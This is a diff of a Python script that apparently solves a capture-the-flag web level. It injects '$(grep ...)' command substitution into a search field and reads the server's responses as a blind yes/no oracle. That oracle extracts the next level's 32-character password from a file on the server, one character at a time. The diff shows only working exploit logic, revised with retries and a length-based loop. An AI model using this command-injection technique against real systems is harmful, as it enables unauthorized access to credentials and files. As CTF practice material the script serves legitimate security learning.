@@ -5,17 +5,19 @@ password = ""
 
 
 def predicate(prefix: str, nextChar: str):
-    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
-    return "African" in Auther.request(16,
-                                       data={'needle':
-                                             f'$(grep -E ^{prefix}{nextChar}[[:alnum:]]* {Auther.authPathOnServer(17)})'
-                                             }).text
+    try:
+        with Auther.request(16, data={
+            'needle': f'$(grep -E ^{prefix}{nextChar}[[:alnum:]]* {Auther.authPathOnServer(17)})'
+        }) as r:
+            return "African" not in r.text
+    except:
+        return predicate(prefix, nextChar)
 
 
-while predicate(password, '[[:alnum:]]'):
+while len(password) < 32:
     print(f"Progress: {password.ljust(32, '*')} -> ", end="")
     chosen_chaset = string.ascii_letters
-    if predicate(password, '[[:alpha:]]'):
+    if predicate(password, '[[:digit:]]'):
         chosen_chaset = string.digits
     else:
         chosen_chaset = string.ascii_uppercase if predicate(
